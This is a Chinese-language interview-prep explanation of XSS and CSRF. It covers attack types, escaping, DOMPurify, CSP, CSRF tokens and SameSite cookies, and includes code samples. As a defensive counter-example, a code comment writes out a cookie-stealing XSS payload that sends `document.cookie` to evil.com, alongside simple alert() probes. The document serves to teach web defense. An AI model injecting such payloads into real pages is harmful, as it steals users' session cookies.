**先讲 XSS（跨站脚本）**。本质是**把不可信内容当成了代码执行**。分三类：① **存储型**——恶意脚本存进数据库（如评论区），别人打开页面就被执行，危害最大；② **反射型**——脚本藏在 URL 参数里，服务端原样反射回页面，诱导点击触发；③ **DOM 型**——不经过服务端，前端 JS 把 `location.hash`、URL 参数等直接 `innerHTML` 进 DOM 导致执行。防御核心是**别让不可信内容变成可执行代码**：输出到 HTML 时用**上下文相关的转义**（HTML 实体、属性、JS 字符串各自不同）；绝不用 `innerHTML` 渲染用户输入，改用 `textContent`；需要富文本就做**白名单过滤（如 DOMPurify）**。再叠加**CSP（Content-Security-Policy）**限制脚本来源、禁用内联脚本，即使漏一处 XSS 也难执行；Cookie 设 **HttpOnly** 让 JS 读不到，断了 XSS 偷 Cookie 的后路。

**再讲 CSRF（跨站请求伪造）**。本质是**浏览器自动带 Cookie 的机制被滥用**：攻击者构造一个页面，里面藏一个指向 `bank.com/transfer` 的表单/图片请求，受害者登录状态下打开，浏览器**自动带上 bank 的 Cookie**，于是「以受害者身份」完成了转账。注意 CSRF 拿不到响应、也读不到 Cookie 内容，它只是「冒名发请求」。防御有三板斧：① **CSRF Token**——服务端给表单/请求发一个随机 token，前端提交时带上，服务端校验，攻击者跨站拿不到这个 token（同源策略限制读取）；② **SameSite Cookie**——设 `SameSite=Lax/Strict` 让第三方上下文不自动带 Cookie；③ **校验 Origin/Referer** 头，非同源直接拒。三者通常组合使用，且敏感操作再加**二次确认/短信验证**。

**讲个真实案例**。我们评论区早年出过存储型 XSS：用户昵称直接 `innerHTML` 进页面，有人存了 `<img src=x onerror=...>`，所有访客都被种了挖矿脚本。修复是**全站统一用 textContent + 富文本走 DOMPurify 白名单**，并上了 CSP 禁止内联脚本、Cookie 全设 HttpOnly。另一次是提现接口被 CSRF：攻击者把提现请求做成自动提交表单钓鱼，我们补了 **CSRF Token + SameSite=Lax**，并让提现接口要求 `Referer` 同源，问题根除。

**边界与取舍**：XSS 与 CSRF 常被一起考，要能一句话区分「XSS 是执行恶意脚本、CSRF 是冒用身份发请求」。现代框架下（React/Vue）默认转义已挡掉大部分 XSS，但 `v-html`/`dangerouslySetInnerHTML` 是故意开的后门，必须人工把关。CSP 是纵深防御的最后一道，但配置要谨慎避免误伤正常资源。

**收尾**：XSS 防「代码被执行」、靠转义 + 白名单 + CSP + HttpOnly；CSRF 防「身份被冒用」、靠 Token + SameSite + 来源校验；两者互补，都是前端安全的基本盘。

@points
XSS 是注入并执行恶意脚本（偷数据/劫持），分存储/反射/DOM 三型；CSRF 是借 Cookie 冒名发请求
XSS 防御：上下文转义、禁用危险 innerHTML、富文本白名单（DOMPurify）、CSP、HttpOnly
CSRF 防御：CSRF Token、SameSite Cookie、校验 Origin/Referer，敏感操作加二次确认
XSS 与 CSRF 本质不同：前者夺执行权，后者盗身份凭证，不可混为一谈
框架默认转义已挡多数 XSS，但 v-html/dangerouslySetInnerHTML 需人工把关；CSP 为兜底

@steps
识别输入来源：用户评论、URL 参数、第三方数据均视为不可信
XSS 防护：输出时按上下文转义，渲染用 textContent，富文本走白名单过滤
叠加 CSP 限制脚本源与禁用内联，Cookie 设 HttpOnly 防止被 JS 读取
CSRF 防护：服务端下发随机 Token，前端随请求携带，服务端校验
设置 SameSite Cookie 限制第三方携带，并校验请求 Origin/Referer
敏感操作增加二次验证，纵深防御降低被绕过风险

@followups
XSS 和 CSRF 最根本区别？——XSS 是让恶意脚本在受害者浏览器执行（获取执行权），CSRF 是冒用受害者 Cookie 身份发请求（获取身份），前者能读能执行、后者只能发不能读
CSP 为什么能防 XSS？——通过白名单限制可执行的脚本来源、禁止内联 script，即使有注入点也无法加载/执行外来或内联恶意脚本
SameSite=Strict 和 Lax 差在哪？——Strict 完全禁止跨站带 Cookie（连正常跳转也不带），Lax 允许安全方法的顶级导航带 Cookie，兼顾安全与体验

@example
### 1. 三种 XSS 的触发与防御对比

```html
<!-- 存储型：恶意内容存进数据库，渲染时执行（最危险） -->
<!-- 反例：后端把昵称原样返回，前端直接塞进 innerHTML -->
<div id="nick"></div>
<script>
  // 攻击者在昵称里存了：<img src=x onerror="fetch('//evil.com?c='+document.cookie)">
  document.getElementById('nick').innerHTML = userNickname // 千万别这么写
  // 正解：用 textContent，浏览器把它当纯文本，不解析标签
  document.getElementById('nick').textContent = userNickname
</script>

<!-- 反射型：脚本藏在 URL，服务端反射回页面 -->
<!-- https://example.com/search?q=<script>alert(1)</script> -->
<!-- 服务端若把 q 直接拼进 HTML 返回即中招；正确做法是输出转义 -->

<!-- DOM 型：纯前端把 URL 参数写入 DOM，不经服务端 -->
<script>
  // 反例：location.search 内容直接进 DOM
  document.body.innerHTML = '你搜的是：' + location.search
  // 正解：转义后再插入，或使用 textContent
</script>
```

### 2. 富文本用 DOMPurify 做白名单过滤

```javascript
import DOMPurify from 'dompurify'

// 用户提交的富文本（如评论支持加粗/链接），先过一遍白名单
const dirty = '<p onclick="steal()">你好<a href="javascript:alert(1)">链接</a></p>'
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['p', 'a', 'b', 'i', 'br'],     // 只允许安全的标签
  ALLOWED_ATTR: ['href'],                        // 只允许 href 属性
})
// clean 里 onclick 被去掉，href 的 javascript: 协议也会被过滤
console.log(clean) // <p>你好<a href="...">链接</a></p>
```

### 3. 服务端下发的 CSP 与 CSRF Token

```http
# CSP：只允许同源脚本与指定 CDN，禁止内联 script（挡住注入执行）
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none'

# 登录时给前端下发 CSRF Token（可放表单隐藏域或请求头）
Set-Cookie: csrf_token=randomabc; HttpOnly; Secure; SameSite=Lax

# 前端提交敏感操作时带上 Token（攻击者跨站无法读取这个值）
POST /transfer HTTP/1.1
Origin: https://www.example.com
X-CSRF-Token: randomabc
Cookie: session=...
```

```javascript
// 前端统一在请求头带 CSRF Token（从 meta 或 Cookie 读取，注意非 HttpOnly 才可读）
const csrf = document.querySelector('meta[name=csrf]').content
fetch('/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': csrf, 'Content-Type': 'application/json' },
  body: JSON.stringify({ to: 'bob', amount: 100 }),
})
```

### 4. SameSite Cookie 与 Referer 校验

```http
# 关键：给会话 Cookie 加 SameSite，第三方站点发起的请求不带它，CSRF 直接失效
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax

# 服务端对敏感接口校验 Origin，非同源直接拒绝（CSRF 跨站时 Origin 不符）
# 请求头示例：
Origin: https://www.example.com          # 同源，放行
# 攻击者的伪造页面发起时：
Origin: https://evil.com                 # 非同源，拒绝
```
```
```
